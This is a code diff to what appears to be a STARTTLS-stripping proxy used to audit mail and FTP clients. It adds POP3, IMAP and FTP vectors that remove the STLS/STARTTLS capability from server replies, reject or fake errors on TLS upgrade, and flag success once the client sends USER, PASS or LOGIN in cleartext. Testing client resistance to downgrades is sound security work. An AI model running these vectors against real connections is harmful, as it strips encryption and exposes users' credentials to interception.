@@ -399,6 +399,25 @@ class Vectors:
     
     class POP3:
         _PROTO_ID = 110
+
+        class StripFromCapabilities:
+            ''' 1) Force Server response to *NOT* announce STLS support
+                2) raise exception if client tries to negotiated STLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                if data.lower().startswith('+ok capability'):
+                    features = [f for f in data.strip().split('\r\n') if not "stls" in f.lower()]
+                    data = '\r\n'.join(features)+'\r\n'
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if data.lower().startswith("stls"):
+                    raise ProtocolViolationException("whoop!? client sent STLS even though we did not announce it.. proto violation: %s"%repr(data))
+                elif any(c in data.lower() for c in ('list','user ','pass ')):
+                    rewrite.set_result(session, True)
+                return data
+
         class StripWithError:
             ''' 1) force server error on client sending STLS
             '''
@@ -411,6 +430,8 @@ class Vectors:
                     session.inbound.sendall("-ERR unknown command\r\n")
                     logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("-ERR unknown command\r\n")))
                     data=None
+                elif any(c in data.lower() for c in ('list','user ','pass ')):
+                    rewrite.set_result(session, True)
                 return data
     
         class UntrustedIntercept:
@@ -444,6 +465,8 @@ class Vectors:
                     session.outbound.ssl_wrap_socket()
     
                     data=None
+                elif any(c in data.lower() for c in ('list','user ','pass ')):
+                    rewrite.set_result(session, True)
                 return data
             
     class IMAP:
@@ -461,6 +484,8 @@ class Vectors:
             def mangle_client_data(session, data, rewrite):
                 if "STARTTLS" in data:
                     raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                elif " LOGIN " in data:
+                    rewrite.set_result(session, True)
                 return data
             
         class StripWithError:
@@ -476,6 +501,8 @@ class Vectors:
                     session.inbound.sendall("%s BAD unknown command\r\n"%id)
                     logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%s BAD unknown command\r\n"%id)))
                     data=None
+                elif " LOGIN " in data:
+                    rewrite.set_result(session, True)
                 return data
     
         class UntrustedIntercept:
@@ -510,6 +537,8 @@ class Vectors:
                     session.outbound.ssl_wrap_socket()
     
                     data=None
+                elif " LOGIN " in data:
+                    rewrite.set_result(session, True)
                 return data
             
     class FTP:
@@ -527,8 +556,10 @@ class Vectors:
                 return data
             @staticmethod
             def mangle_client_data(session, data, rewrite):
-                if "STARTTLS" in data:
+                if "AUTH TLS" in data:
                     raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                elif "USER " in data:
+                    rewrite.set_result(session, True)
                 return data
         
         class StripWithError:
@@ -543,6 +574,8 @@ class Vectors:
                     session.inbound.sendall("500 AUTH TLS not understood\r\n")
                     logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("500 AUTH TLS not understood\r\n")))
                     data=None
+                elif "USER " in data:
+                    rewrite.set_result(session, True)
                 return data
     
         class UntrustedIntercept:
@@ -576,6 +609,8 @@ class Vectors:
                     session.outbound.ssl_wrap_socket()
     
                     data=None
+                elif "USER " in data:
+                    rewrite.set_result(session, True)
                 return data
             
     class NNTP:
